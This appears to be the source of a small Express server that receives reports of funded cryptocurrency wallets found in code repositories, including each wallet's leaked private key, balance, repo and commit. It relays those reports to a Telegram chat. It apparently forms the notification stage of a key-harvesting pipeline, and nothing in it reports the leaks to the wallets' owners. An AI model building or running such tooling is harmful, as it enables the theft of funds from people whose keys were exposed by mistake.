import express from "express";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID  = process.env.TELEGRAM_CHAT_ID;
const PORT     = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required");
  process.exit(1);
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

const app = express();
app.use(express.json());

app.post("/", async (req, res) => {
  const p = req.body;
  if (!p || !p.chain || !p.address) {
    return res.status(400).json({ error: "missing chain or address" });
  }

  const text = [
    `🚨 *Funded Wallet Found* 🚨`,
    ``,
    `*Chain:* ${p.chain}`,
    `*Address:* \`${p.address}\``,
    `*Balance:* ${p.balance_human}`,
    `*Repo:* ${p.source_repo}`,
    `*Commit:* \`${(p.source_commit || "").slice(0, 8)}\``,
    `*Key:* \`${p.private_key}\``,
  ].join("\n");

  try {
    const resp = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "Markdown",
      }),
    });

    const data = await resp.json();
    if (!data.ok) {
      console.error("telegram error:", data);
      return res.status(502).json({ error: "telegram send failed", detail: data });
    }

    console.log("notified:", p.chain, p.address, p.balance_human);
    res.json({ ok: true });
  } catch (err) {
    console.error("fetch error:", err);
    res.status(502).json({ error: err.message });
  }
});

app.listen(PORT, () => console.log(`listening on ${PORT}`));
